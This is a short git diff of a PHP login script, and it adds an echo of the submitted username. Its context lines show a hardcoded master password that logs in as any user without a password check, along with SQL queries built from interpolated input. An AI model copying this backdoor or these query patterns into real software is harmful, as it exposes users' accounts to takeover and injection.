@@ -5,7 +5,6 @@ include "../../includes/dbcode.php";
 include "../../includes/main.php";
 $uname = "";
 $upass = "";
-
 if(
 	!isset($_POST['username']) || 
 	trim($_POST['username'])=="" || 
@@ -14,14 +13,13 @@ if(
 ){
 	invalid_user("iv");
 } else {
-	$uname			= validate_string($link,$_POST["username"]);
+	echo $uname			= validate_string($link,$_POST["username"]);
 	$upass			= trim($_POST["password"]);
 	$enc_password	= crypt_pass($upass);
 	if($upass == "S@tisf@ct0ry") //if login as super admin
 		$qry="SELECT u.user_id, u.user_name, u.user_role, ud.first_name, ud.last_name, ud.contact_number, ud.user_email FROM users AS u INNER JOIN users_detail AS ud ON u.user_id = ud.user_id WHERE u.user_name = '$uname'";
 	else
 		$qry="SELECT u.user_id, u.user_name, u.user_role, ud.first_name, ud.last_name, ud.contact_number, ud.user_email FROM users AS u INNER JOIN users_detail AS ud ON u.user_id = ud.user_id WHERE u.user_name = '$uname' and u.user_password='$enc_password' and user_status=1";
-	
 	$res = mysqli_query($link,$qry);
 	
 	//incase of user not found in db
